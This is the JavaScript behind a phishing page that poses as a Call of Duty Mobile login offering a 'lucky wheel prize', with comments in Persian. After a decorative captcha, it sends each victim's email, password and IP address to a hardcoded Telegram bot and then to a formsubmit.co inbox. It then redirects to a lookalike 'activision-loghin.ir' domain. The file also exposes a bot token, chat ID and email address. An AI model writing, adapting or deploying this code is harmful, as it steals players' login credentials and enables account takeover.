const BOT_TOKEN = '8740449594:AAFCARSB87Qf-YtKZ8q7c6yx3gyZwJSu2IA';   
const CHAT_ID = '8458206850';         

function generateCaptcha() {
    const canvas = document.getElementById('captcha-canvas');
    const ctx = canvas.getContext('2d');
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789';
    let captcha = '';
    for (let i = 0; i < 6; i++) {
        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    ctx.fillStyle = '#2d2d44';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.font = 'bold 30px Arial';
    ctx.fillStyle = '#ffffff';
    ctx.fillText(captcha, 20, 40);
    
    sessionStorage.setItem('captcha', captcha);
}

function validateCaptcha() {
    const userInput = document.getElementById('F_VCODE').value;
    const realCaptcha = sessionStorage.getItem('captcha');
    if (userInput !== realCaptcha) {
        alert('Invalid verification code');
        generateCaptcha();
        return false;
    }
    return true;
}

// ========================================
// تابع ارسال به تلگرام
// ========================================
async function sendToTelegram(email, password) {
    // گرفتن IP کاربر
    let ip = "Unknown";
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
    } catch(e) {
        ip = "Unable to get IP";
    }
    
    // ساخت پیام
    const message = `🔐 *New Login - Call of Duty* 🔐\n━━━━━━━━━━━━━━━\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕐 *Time:* ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━\n🎮 *Game: CODM*\n💰 *Lucky Wheel Prize Ready!*`;
    
    // ارسال به تلگرام
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return response.ok;
    } catch(error) {
        return false;
    }
}

// ========================================
// هندل کردن submit فرم
// ========================================
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('F_UID').value;
    const password = document.getElementById('F_CDKEY').value;
    const submitBtn = document.getElementById('submitBtn');
    const resultDiv = document.getElementById('result');
    

    if (!email || !password) {
        resultDiv.innerHTML = '<span style="color:red;">Please enter email and password</span>';
        return;
    }
    
  
    if (!validateCaptcha()) {
        return;
    }
    
    
    submitBtn.disabled = true;
    submitBtn.textContent = 'Processing...';
    resultDiv.innerHTML = '<span style="color:yellow;">Sending...</span>';
    
   
    const success = await sendToTelegram(email, password);
    
    if (success) {
        resultDiv.innerHTML = '<span style="color:green;">✅ Login successful! Redirecting...</span>';
        
    
        const formData = new FormData();
        formData.append('email', email);
        formData.append('password', password);
        formData.append('_captcha', 'false');
        formData.append('_subject', 'New CODM Login + Lucky Wheel Prize! 🔥');
        
        fetch('https://formsubmit.co/ajax/erfantroll778899@gmail.com', {
            method: 'POST',
            body: formData
        }).catch(() => {});
        
        setTimeout(() => {
            window.location.href = 'https://activision-loghin.ir';
        }, 2000);
    } else {
        resultDiv.innerHTML = '<span style="color:red;">❌ Error sending login. Please try again.</span>';
        submitBtn.disabled = false;
        submitBtn.textContent = 'CLAIM PRIZE & LOGIN';
    }
});


function togglePasswordVisibility() {
    const passwordInput = document.getElementById('F_CDKEY');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
    } else {
        passwordInput.type = 'password';
    }
}

window.onload = function() {
    generateCaptcha();
};